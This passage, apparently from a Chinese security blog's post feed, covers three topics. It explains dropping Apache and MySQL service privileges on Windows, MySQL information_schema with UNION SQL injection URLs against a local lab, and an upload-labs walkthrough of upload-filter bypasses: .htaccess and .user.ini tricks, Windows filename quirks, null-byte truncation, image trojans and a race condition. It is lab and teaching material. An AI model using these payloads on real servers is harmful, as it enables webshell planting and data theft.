alt="img"></p><p>此时webshell就只有普通用户权限了</p><p><strong>mysql降权</strong></p><p>mysql降权与Apache降权一样，同样是创建一个用户，找到mysql服务，选择账户登录</p><p>同样是创建一个普通账户</p><p><img src="E:\云笔记\1320143699@qq.com\ee96f3ff68b24db289fb7fdff2dd07e5\clipboard.png" alt="img"></p><p>然后找到mysql服务，选择账户登录</p><p><img src="E:\云笔记\1320143699@qq.com\57bdd016e49d4b8795bcf74c5cd06985\clipboard.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\b4d02ed0dbd640b499680335bed16aaa\clipboard.png" alt="img"></p><p>应用，确定</p><p>2.重启服务时出现错误</p><p><img src="E:\云笔记\1320143699@qq.com\5b39f4603728413eb8cb2ceca390ed0d\clipboard.png" alt="img"></p><p>打开事件查看器</p><p>发现并没有报错，于是我们按照Apache的猜想，估计也是权限不足问题，于是找到mysql文件夹，将其赋予权限</p><p><img src="E:\云笔记\1320143699@qq.com\5870fbc818574b4884e25ca1448634d6\clipboard.png" alt="img"></p><p>除此之外，因为并不清楚里面文件是否也会有存在权限缺失问题，于是我选择了让mysql文件里面的所有后续子文件都赋予了此权利</p><p><img src="E:\云笔记\1320143699@qq.com\437dd7f8bf9c4a648c46183111c1876a\1~k~5`t6_(ooub]zqkz`8lg.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\b4b68e6159ab48d1a44732312e3e1cd2\4av_v$q94jl{2fve]186" alt="img">of.png)</p><p><img src="E:\云笔记\1320143699@qq.com\3de106ae25364b11814e6b0bf81c0a2b\clipboard.png" alt="img"></p><p>然后确定，应用就ok了</p><p>3.然后我们再去重启mysql就重启成功了</p><p><img src="E:\云笔记\1320143699@qq.com\5c5a7eded1e74aff85051da7d99dc443\clipboard.png" alt="img"></p><h1 id="windows下Apache降权"><a href="#windows下Apache降权" class="headerlink" title="windows下Apache降权"></a>windows下Apache降权</h1><p> 环境：Windows server 2012</p><p>phpstudy2016</p><p> 步骤</p><p>1.打开 phpstudy2018，其他选项菜单 –》服务管理器 –》Apache–》安装服务。运行模式选择系统服务，应用</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225318.jpg"></p><p>查看服务，当服务中有如图所示名称服务成功。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225327.jpg"></p><p>如果不能通过 phpstudy 安装服务，可在 apache 安装目录下的 bin 执行命令安装：</p><p>httpd -k install</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225331.png"></p><p>2.降权操作</p><p>①向web端上传一个PHP大马，测试权限，如图</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225336.png"></p><p>一般来说以服务模式启动Apache权限为最高级system</p><p>为避免web端被入侵，并直接拥有system权限，于是创建一个普通的users用户组的账号来控制Apache服务</p><p>具体步骤： </p><p>①新建一个名为Apache9密码为123456的用户</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225342.png"></p><p>②然后右键 apache 服务，属性，登录栏选择浏览用户，高级立即查找找到对应账号。然后注意下密码重新输入对应密码。应用</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225352.png"></p><p>点击浏览选择我们此前所创建的账户</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225400.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225405.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225445.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225410.png"></p><p>应用之后重启</p><p>3.Apache服务不能正常启动</p><p>根据其报错，参看系统事件日志查看原因</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225501.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225514.jpg"></p><p>发现有两个错误，分别为不能打开log文件和不能打开logs</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225524.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225534.png"></p><p>根据错误提示，估计就是权限问题，找到该文件位置，对其权限管理分配给Apache完整的权限</p><p>首先对error.log属性，安全，增加apache用户权限</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225545.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225558.png"></p><p>最后在任务管理器中可查看到此时apache服务的用户为我们所创建的apache9的用户权限</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225608.png"></p><p>再来测试下我们之前所上传的大马</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225616.png"></p><p>此时webshell就只有普通用户权限了</p><h1 id="mysql降权"><a href="#mysql降权" class="headerlink" title="mysql降权"></a>mysql降权</h1><p>mysql降权与Apache降权一样，同样是创建一个用户，找到mysql服务，选择账户登录</p><p>同样是创建一个普通账户</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225622.png"></p><p>然后找到mysql服务，选择账户登录</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225628.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225636.png"></p><p>应用，确定</p><p>2.重启服务时出现错误</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225642.png"></p><p>打开事件查看器</p><p>发现并没有报错，于是我们按照Apache的猜想，估计也是权限不足问题，于是找到mysql文件夹，将其赋予权限</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225650.png"></p><p>除此之外，因为并不清楚里面文件是否也会有存在权限缺失问题，于是我选择了让mysql文件里面的所有后续子文件都赋予了此权利</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225716.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225725.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225733.png"></p><p>然后确定，应用就ok了</p><p>3.然后我们再去重启mysql就重启成功了</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302225745.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL降权 </tag>
            
            <tag> Apache降权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>information_schema</title>
      <link href="post/3e3eb442.html"/>
      <url>post/3e3eb442.html</url>
      
        <content type="html"><![CDATA[<h3 id="information-schema简介"><a href="#information-schema简介" class="headerlink" title="information_schema简介"></a>information_schema简介</h3><p>mysql自带数据库，里面存储了mysql服务器中的其他数据库的基本信息，包括数据库的名、数据库表、列表名、表栏的数据类型和访问权限等，一般在SQL注入中，可通过此来获取数据库的相关信息</p><p>关于information_schema这个系统自带的库，是在mysql5.0之后出现的，在5.0以前是没有这个的，只能暴力去跑，并且5.0以下是单用户操作，5.0以上是多用户操作</p><h3 id="基本表"><a href="#基本表" class="headerlink" title="基本表"></a>基本表</h3><ul><li><p>SCHEMATA表：存储了mysql中所有数据库的信息— select * from information_schema.SCHEMATA;</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210126124607.png"></p></li><li><p>TABLES表：存储了数据库的所有表的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show tables from information_schema;</span><br><span class="line">select table_schema,table_name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210126124648.png"></p><p>   <img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210126124639.png"></p></li><li><p>COLIMNS表：表中列的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show columns from schemaname.tablename</span><br><span class="line">select table_schema,table_name,column_name from information_schema.columns;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210126124622.png"></p></li><li><p>STATISTICS表：表索引的信息—-show index from schemaname.tablename</p></li><li><p>USER_PRIVILEGES(用户权限)表：全称权限的信息。来源于mysql.user授权表。</p></li><li><p>SCHEMA_PRIVILEGES(方案权限)表：关于方案（数据库）权限的信息。来源于mysql.db授权表</p></li><li><p>TABLE_PRIVILEGES(表权限)表：关于表权限的信息，来自于mysql.tables_priv授权表</p></li><li><p>COLUMN_PRIVILEGES(列权限)表：列权限信息，来自于mysql.columns_priv授权表</p></li><li><p>CHARACTER_SETS(字符集)表：存储了mysql实例可用字符集的信息—-show  character set</p></li><li><p>COLLATIONS表：提供了关于各字符集的对照信息。</p></li><li><p>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</p></li><li><p>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</p></li><li><p>KEY_COLUMN_USAGE表：描述了具有约束的键列。</p></li><li><p>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</p></li><li><p>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表</p></li><li><p>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。</p></li></ul><h3 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h3><ul><li><p>获取数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinject.php?name&#x3D;-1 union select 1,2,3,4,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210126124550.png"></p></li></ul><ul><li>获取表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinject.php?name&#x3D;-1 union select 1,2,3,4,table_name from information_schema.tables  where table_schema&#x3D;&#39;information&#39;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210121223617.png"></p><ul><li><p>获取字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinject.php?name&#x3D;-1 union select 1,2,3,4,column_name from information_schema.columns  where table_schema&#x3D;&#39;information&#39; and table_name&#x3D;&#39;user&#39;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hang-thresh/imgbed/images/20210121223625.png"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> MySQL数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql数据库 </tag>
            
            <tag> information_schema </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="post/80f02bc5.html"/>
      <url>post/80f02bc5.html</url>
      
        <content type="html"><![CDATA[<h3 id="Pass-01-前端js绕过"><a href="#Pass-01-前端js绕过" class="headerlink" title="Pass-01-前端js绕过"></a>Pass-01-前端js绕过</h3><p>随机上传一个PHP后缀文件</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135805.png"></p><p>发现弹出弹窗提示，不允许上传非图片类型文件，看下前端代码</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135810.png"></p><p>发现前端js对上传文件类型做了判断，于是抓包，先上传一个jpg结尾的文件，然后在抓包修改文件后缀为php,放包，成功</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135821.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135844.png"></p><h3 id="Pass-02-文件类型绕过"><a href="#Pass-02-文件类型绕过" class="headerlink" title="Pass-02-文件类型绕过"></a>Pass-02-文件类型绕过</h3><p>同样先上传一个PHP的后缀文件，发现提示文件类型不正确</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135859.png"></p><p>于是查看源代码，发现对文件类型做了限制</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135852.png"></p><p>那么抓包修改文件类型就是了</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135906.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135918.png"></p><h3 id="Pass-03-黑名单绕过-后缀名"><a href="#Pass-03-黑名单绕过-后缀名" class="headerlink" title="Pass-03-黑名单绕过-后缀名"></a>Pass-03-黑名单绕过-后缀名</h3><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130135927.png"></p><p>黑名单过滤，禁止上传.asp|.aspx|.php|.jsp后缀文件。</p><p>思路：主要考察可执行后缀，在Apache中phtml、php3等没有</p><p>可执行后缀可以在httpd.conf中查找AddType application/x-httpd-php，看apache配置中是否有设置，如果没有配置，可自行配置构造环境）</p><p>例如：AddType application/x-httpd-php .php .php3 .phtml</p><p>由于我使用的是最新的phpstudy+Windows,就不复现了，大致思路是这样就OK了</p><h3 id="Pass-04-黑名单绕过-htaccess"><a href="#Pass-04-黑名单绕过-htaccess" class="headerlink" title="Pass-04-黑名单绕过-.htaccess"></a>Pass-04-黑名单绕过-.htaccess</h3><p>还是一样上传一个PHP的后缀文件夹，发现就提示此文件不允许上传</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140408.png"></p><p>看了下源代码过滤，发现基本都过滤了，但没有过滤.htaccess,于是可以利用.htaccess特性去进行绕过。</p><blockquote><p>htaccess文件时Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能，其中.htaccess文件内容:<strong>SetHandler application/x-httpd-php</strong>设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。</p></blockquote><p>但要实现这一绕过，得保证apache配置文件（httpd.conf）中设置AllowOverride为All</p><p>步骤：</p><p>1.上传.htaccess文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><p>2.上传一句话木马，后缀名改为.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>3.访问</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140414.png"></p><h3 id="Pass-05-黑名单绕过-user-ini"><a href="#Pass-05-黑名单绕过-user-ini" class="headerlink" title="Pass-05-黑名单绕过-.user,ini"></a>Pass-05-黑名单绕过-.user,ini</h3><p>还是同样上传一个php的后缀文件，发现提示文件类型不允许上传，查看源码，发现连.htaccess也过滤了，但是没有过滤.user.ini</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140428.png"></p><p>于是上传一个以auto_prepend_file=a.gif为内容的.user.ini文件，然后再上传php脚本，文件命名为a.gif，与前面内容为·····=a.gif相对应，.user.ini文件内容意思为：所有的php文件都自动包含a.jif文件。.user.ini将所有php文件自动包含任意木马文件执行，就类似于上面的.htaccess绕过大致原理思路是是一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">###.user.ini</span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br><span class="line"></span><br><span class="line">###a.jpg</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>上传后，重启服务，然后访问readme.php时会自动包含a.jpg</p><p>但是我发现还是没能成功，百度解决了好久还是没有一个正确的解答，基本都是这样的方式，可能跟个种版本的问题有关系，后面也就没有去弄了</p><p>但是我发现这一关可以用”. .”（中间有一个空格）去绕过，但脱离了本身出题的思路了，因为源码的过滤只过滤了一次，反正有很多关都可以用这个思路去绕过，算是一个小的bug吧</p><h3 id="Pass-06-黑名单绕过-大小写"><a href="#Pass-06-黑名单绕过-大小写" class="headerlink" title="Pass-06-黑名单绕过-大小写"></a>Pass-06-黑名单绕过-大小写</h3><p>普通上传一个php后缀文件，然后抓包修改后缀为.PHP,由于在windows中不区分大小写，所以同样能以.php文件执行</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140717.png"></p><p>放包，成功上传,访问存储位置，成功执行</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140723.png"></p><h3 id="Pass-07-黑名单绕过-空格绕过"><a href="#Pass-07-黑名单绕过-空格绕过" class="headerlink" title="Pass-07-黑名单绕过-空格绕过"></a>Pass-07-黑名单绕过-空格绕过</h3><p>同样抓包上传一个.php文件，然后在后缀名后面加上一个空格即可绕过，因为在windows下时，会自动省略空格，从而达到执行目的，在上传时由于没有做好过滤从而导致在文件后缀加空格，而这个空格被当做了字符进行判定，从而没能过滤.php</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140734.png"></p><p>放包，成功上传</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140927.png"></p><p>访问返回地址，成功</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140921.png"></p><h3 id="Pass-08-黑名单绕过-点号绕过"><a href="#Pass-08-黑名单绕过-点号绕过" class="headerlink" title="Pass-08-黑名单绕过-点号绕过"></a>Pass-08-黑名单绕过-点号绕过</h3><p>在.php后面加上一个点（.php.)上传，在上传时，.会被当做字符处理去进行过滤判断，然而在Windows下，文件后缀名的最后一个点会被自动去除，从而执行木马</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140934.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140941.png"></p><h3 id="Pass-09-黑名单绕过-特殊字符（-DATA）绕过"><a href="#Pass-09-黑名单绕过-特殊字符（-DATA）绕过" class="headerlink" title="Pass-09-黑名单绕过- 特殊字符（::$DATA）绕过"></a>Pass-09-黑名单绕过- 特殊字符（::$DATA）绕过</h3><p>在windows情况下，文件名加“::$DATA”，会把::$DATA之后的数据当成文件流处理，不会被检测后缀名，保持之前的文件名，简单点来说，就是在Windows系统下，如果上传的文件名中a.php::$DATA会在服务器上生成一个test.php的文件，其内容与所上传文件内容相同，并被解析，所以注意的是，在访问时，应以a.php去进行访问</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140948.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130140957.png"></p><p>从上传文件存储处可以看见我们所上传的是phpinfo.php::$DATA文件，在上传成功之后，除了对名字从定义之外，::$DATA被去掉了。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141005.png"></p><h3 id="Pass-10-黑名单绕过-php-空格"><a href="#Pass-10-黑名单绕过-php-空格" class="headerlink" title="Pass-10-黑名单绕过-.php.(空格)."></a>Pass-10-黑名单绕过-.php.(空格).</h3><p>虽然在源代码中已经自动删除了文件后面的.，但尝试了加两个点，发现成功绕过，应该只是删除了一个点，绕后利用Windows特性，默认执行为php文件</p><p>上传phpinfo.php. .形式的样式</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141146.png"></p><h3 id="Pass-11-黑名单绕过-双写绕过"><a href="#Pass-11-黑名单绕过-双写绕过" class="headerlink" title="Pass-11-黑名单绕过-双写绕过"></a>Pass-11-黑名单绕过-双写绕过</h3><p>检查源代码，发现str_ireplace函数将符合黑名单中的后缀名进行替换为空，于是想着加多加一个能行不，发现成功绕过，其实感觉跟上一题一样都是只进行了一个过滤或替换，包括上一题的思路可以用到1-10关符合的，都可以利用只进行一次过滤判断，去绕过，应该算是一个小的BUG吧，毕竟跟提示的绕过方式不一样</p><p>上传文件形式(构建后缀让其从左到右识别php后，进行替换，但还剩下前后形成的php)</p><p>phpinfo.pphphp</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141156.png"></p><h3 id="Pass-12-白名单绕过-get型0x00截断"><a href="#Pass-12-白名单绕过-get型0x00截断" class="headerlink" title="Pass-12-白名单绕过-get型0x00截断"></a>Pass-12-白名单绕过-get型0x00截断</h3><p>查看源码，发现只允许上传jpg、png、gif文件，抓包发现保存路径可控，于是想到可利用00截断绕过</p><p>其主要原理为：在系统读取文件名，如果读取到0x00,就会读取结束，0x表示16进制，URL中%00解码成16进制就是0x00</p><p>注意：需要php版本&lt;5.3.4,并且magic_quotes_gpc关闭</p><blockquote><p>eg:<a href="http://www.xxx.com/aa.php%00.jpg">www.xxx.com/aa.php%00.jpg</a>    ——》 <a href="http://www.xxx.com/aa.php">www.xxx.com/aa.php</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141208.png"></p><p>抓包构造绕过</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141241.png"></p><p>访问时，要去掉php后缀后的内容，只留下aa.php</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141250.png"></p><h3 id="Pass-13-白名单绕过-post型0x00截断"><a href="#Pass-13-白名单绕过-post型0x00截断" class="headerlink" title="Pass-13-白名单绕过-post型0x00截断"></a>Pass-13-白名单绕过-post型0x00截断</h3><p>post类型的00截断与get类型的00截断在于%00截断在get中被url解码之后是空字符，但是在post中%00不会被url解码，所以需要在hex中修改16进制00截断</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141259.png"></p><p>在hex中找到phpinfo.php,p后的0d（根据情况自行判定）改为00后放包上传<img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141310.png"></p><p>复制图片地址去掉.php后面的部分，访问</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141320.png"></p><h3 id="Pass-14-图片马，文件包含利用"><a href="#Pass-14-图片马，文件包含利用" class="headerlink" title="Pass-14-图片马，文件包含利用"></a>Pass-14-图片马，文件包含利用</h3><p>由源码可知，该关卡设置的验证方式为文件头检查，如果有不清楚具体的判断，可通过在index.php中找到对应的位置加入echo var_dump($strInfo);去查看返回的值去辅助理解，所以这个地方可直接利用图片马的样式进行上传绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141331.png"></p><p>制作图片马copy  1.jpg/b+2.php/a 3.jpg,然后上传，上传成功后，利用文件包含解析图片马里的php脚本，file为我们的图片马位置</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141353.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141544.png"></p><h3 id="Pass-15-图片马，文件包含利用"><a href="#Pass-15-图片马，文件包含利用" class="headerlink" title="Pass-15-图片马，文件包含利用"></a>Pass-15-图片马，文件包含利用</h3><p>查看发现getimagesize()函数，而该函数的作用就是获取图像信息，$info<a href="https://xz.aliyun.com/t/2657#toc-13">2</a>指的文件的类型image_type_to_extension-根据指定的图像类型返回对应的后缀名，绕过方式也就是利用图片欺骗，用上一关的图片马即可绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141548.png"></p><p>上传访问</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141553.png"></p><h3 id="Pass-16-图片马，文件包含利用"><a href="#Pass-16-图片马，文件包含利用" class="headerlink" title="Pass-16-图片马，文件包含利用"></a>Pass-16-图片马，文件包含利用</h3><p>exif_imagetype($filename)—读取一个图像的第一个字节并检查其签名</p><p>这一关需要开启php_exif模块</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130141607.png"></p><h3 id="Pass-17-图片马加二次渲染"><a href="#Pass-17-图片马加二次渲染" class="headerlink" title="Pass-17-图片马加二次渲染"></a>Pass-17-图片马加二次渲染</h3><p>这里用gif，容易绕过二次渲染，关于二次渲染是根据上传的图片生成一个新的图片，然后删除原先的图片</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130142112.png"></p><p>步骤：</p><p>1.先上传一个普通的gif图片上去，然后在上传一个图片马gif，将上传后的jif的图片保存下来，对比两个的图片（如下），查看那里没有被渲染，对比后发现在图片的头部没有被渲染（content-type：img/gif下面的位置，可以从00开始对比，好比较些），然后在这中间插入一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201194812.png" alt="普通gif"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201194822.png" alt="渲染后的gif"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201195126.png" alt="写入位置"></p><p>成功访问</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201195059.png"></p><h3 id="Pass-18-白名单验证，条件竞争"><a href="#Pass-18-白名单验证，条件竞争" class="headerlink" title="Pass-18-白名单验证，条件竞争"></a>Pass-18-白名单验证，条件竞争</h3><p>通过代码提示发现文件上传后会先在存在缓存文件中，然后在判断删除，但是这个地方有个时间差，可以利用这个时间差来执行操作，一直请求不断上传，这样我们就可能在没有删除之前读取到文件，然后向服务器写入一个shell</p><p>1.首先上传一个php木马脚本，抓取</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201202741.png"></p><p>2.将其请求包，发送到intruder模块，定义一个变量，遍历请求上传</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201202850.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201202927.png"></p><p>3.浏览器一直刷新如果成功写入的访问地址，总有一次会成功解析访问</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210201202947.png"></p><h3 id="Pass-19-白名单验证，图片马"><a href="#Pass-19-白名单验证，图片马" class="headerlink" title="Pass-19-白名单验证，图片马"></a>Pass-19-白名单验证，图片马</h3><p>此关卡跟上一关卡一样，同样是条件竞争，但是此关卡的是需要通过上传图片木马，然后不断的通过文件包含访问图片木马</p><h3 id="Pass-20-黑名单验证，点号绕过"><a href="#Pass-20-黑名单验证，点号绕过" class="headerlink" title="Pass-20-黑名单验证，点号绕过"></a>Pass-20-黑名单验证，点号绕过</h3><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130162450.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210130162457.png"></p><h3 id="Pass-21-白名单验证，数组绕过"><a href="#Pass-21-白名单验证，数组绕过" class="headerlink" title="Pass-21-白名单验证，数组绕过"></a>Pass-21-白名单验证，数组绕过</h3><ol><li><p>验证过程：先检查MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是array数组，不是的话就用explode()函数通过.号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。</p></li><li><p>绕过过程：绕过MIMIE，改一下包的Content-Type，为了绕过explode()函数，需要传入数组，绕过白名单，由于取的是end()也就是数组最后一个，需要传入数组的最后一个为jpg|png|gif，最后是拼接文件名，取的是reset()第一个，即索引为0，和索引count()-1（数组内元素个数-1）。所以令索引0为1.php，索引2为jpg（只要是索引1之后都可），这样数组元素个数为2，拼接的就是索引0和索引1，也就是1.php和空，结果还是1.php，这样就可以使得拼接后的文件名为1.php。如下：</p></li></ol><p>   <img src="C:\Users\LIHANG\AppData\Roaming\Typora\typora-user-images\image-20210224191355599.png" alt="image-20210224191355599"></p><p>   <img src="C:\Users\LIHANG\AppData\Roaming\Typora\typora-user-images\image-20210224192159314.png" alt="image-20210224192159314"></p><p>成功上传</p><p><img src="C:\Users\LIHANG\AppData\Roaming\Typora\typora-user-images\image-20210224192316286.png" alt="image-20210224192316286"></p><h3 id="Windows特性"><a href="#Windows特性" class="headerlink" title="Windows特性"></a>Windows特性</h3><p>上传不符合Windows 文件命名规则的文件，Windows会自动去除非法字符</p><blockquote><p>.php::$DATA</p><p>.php(空格)</p><p>.php.(空格)</p><p>.php.(空格).</p><p>.php::$DATA……</p><p>.php:1.jpg</p><p>.PHP</p><p>.phpphp</p></blockquote><h3 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h3><ol><li><p>文件扩展名服务端白名单校验</p></li><li><p>文件内容服务端校验</p></li><li><p>上传文件重命名</p></li><li><p>隐藏上传文件路径</p></li><li><p>文件上传的目录设置为不可执行</p></li><li><p>单独设置文件服务器的域名</p></li><li><p>图片二次渲染</p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRFTester自动化测试</title>
      <link href="post/7fe67026.html"/>
      <url>post/7fe67026.html</url>
      
